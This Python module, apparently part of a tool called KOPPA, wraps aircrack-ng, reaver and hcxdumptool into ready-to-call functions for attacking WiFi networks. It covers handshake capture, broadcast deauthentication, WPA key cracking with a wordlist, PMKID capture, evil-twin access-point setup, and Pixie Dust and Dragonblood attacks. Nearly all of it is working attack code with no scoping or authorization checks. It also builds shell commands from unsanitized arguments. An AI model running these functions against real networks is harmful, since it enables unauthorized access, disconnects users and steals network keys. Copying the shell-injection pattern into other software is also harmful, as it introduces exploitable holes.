"""KOPPA stdlib: wireless — WiFi security testing (wraps aircrack-ng suite)."""
import subprocess, re, os, time, tempfile


def _sh(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return r.stdout.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return ""
    except Exception:
        return ""


def interfaces():
    """List wireless interfaces."""
    out = _sh("iw dev 2>/dev/null || iwconfig 2>/dev/null")
    ifaces = re.findall(r"^(\w+)\s+(?:Interface|IEEE)", out, re.M)
    return ifaces if ifaces else re.findall(r"^(\w+).*ESSID", out, re.M)


def monitor_mode(iface, enable=True):
    """Enable/disable monitor mode on interface."""
    if enable:
        _sh(f"ip link set {iface} down")
        _sh(f"iw dev {iface} set monitor none 2>/dev/null || airmon-ng start {iface} 2>/dev/null")
        _sh(f"ip link set {iface} up")
        return f"{iface}mon" if not iface.endswith("mon") else iface
    else:
        _sh(f"airmon-ng stop {iface} 2>/dev/null")
        _sh(f"ip link set {iface} down")
        _sh(f"iw dev {iface} set managed 2>/dev/null")
        _sh(f"ip link set {iface} up")
        return iface


def scan(iface, duration=10):
    """Scan for nearby APs. Returns list of AP dicts."""
    out = _sh(f"iwlist {iface} scanning 2>/dev/null || iw dev {iface} scan 2>/dev/null")
    aps = []
    current = {}
    for line in out.splitlines():
        line = line.strip()
        m = re.search(r"ESSID:\"(.*)\"", line)
        if m and current:
            current["ssid"] = m.group(1)
        m = re.search(r"Address:\s+([0-9A-Fa-f:]{17})", line)
        if m:
            if current:
                aps.append(current)
            current = {"bssid": m.group(1).upper()}
        m = re.search(r"Frequency:(\S+)", line)
        if m:
            current["freq"] = m.group(1)
        m = re.search(r"Signal level=(-?\d+)", line)
        if m:
            current["signal"] = int(m.group(1))
        m = re.search(r"Encryption key:(on|off)", line, re.I)
        if m:
            current["encrypted"] = m.group(1).lower() == "on"
    if current and "bssid" in current:
        aps.append(current)
    return aps


def capture_handshake(iface, bssid, channel, output="/tmp/koppa_hs"):
    """Capture WPA2 4-way handshake. Returns capture file path."""
    _sh(f"iw dev {iface} set channel {channel} 2>/dev/null")
    proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {output} {iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(30)
    proc.terminate()
    cap = f"{output}-01.cap"
    return cap if os.path.exists(cap) else ""


def deauth(iface, bssid, client="FF:FF:FF:FF:FF:FF", count=10):
    """Send deauthentication frames to force handshake capture."""
    return _sh(
        f"aireplay-ng --deauth {count} -a {bssid} -c {client} {iface} 2>/dev/null",
        timeout=30
    )


def crack_wpa(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    """Crack WPA/WPA2 handshake with aircrack-ng."""
    out = _sh(
        f"aircrack-ng -w {wordlist} {cap_file} 2>/dev/null",
        timeout=300
    )
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
    return m.group(1) if m else None


def pmkid_attack(iface, bssid=None):
    """Capture PMKID without client via hcxdumptool."""
    cap = tempfile.mktemp(suffix=".pcapng")
    target = f"--filterlist_ap={bssid}" if bssid else ""
    _sh(
        f"hcxdumptool -o {cap} -i {iface} {target} --enable_status=1 2>/dev/null",
        timeout=60
    )
    if os.path.exists(cap):
        hash_out = cap.replace(".pcapng", ".hash")
        _sh(f"hcxpcapngtool -o {hash_out} {cap} 2>/dev/null")
        return hash_out if os.path.exists(hash_out) else cap
    return ""


def evil_twin(iface, ssid, channel=6):
    """Create an evil twin AP config for hostapd."""
    config = f"""interface={iface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
ignore_broadcast_ssid=0
"""
    conf_path = "/tmp/evil_twin.conf"
    with open(conf_path, "w") as f:
        f.write(config)
    return conf_path


def wps_scan(iface, bssid=None):
    """Scan for WPS-enabled APs."""
    target = f"--bssid {bssid}" if bssid else ""
    return _sh(f"wash -i {iface} {target} 2>/dev/null", timeout=30)


def pixie_dust(iface, bssid, channel):
    """Run Pixie Dust attack against WPS."""
    return _sh(
        f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -vv 2>/dev/null",
        timeout=120
    )


def wpa3_dragonblood(iface, bssid):
    """Test for Dragonblood vulnerabilities (WPA3)."""
    return _sh(
        f"dragonforce -i {iface} -b {bssid} 2>/dev/null || "
        f"echo 'dragonforce not installed, manual test required'",
        timeout=60
    )
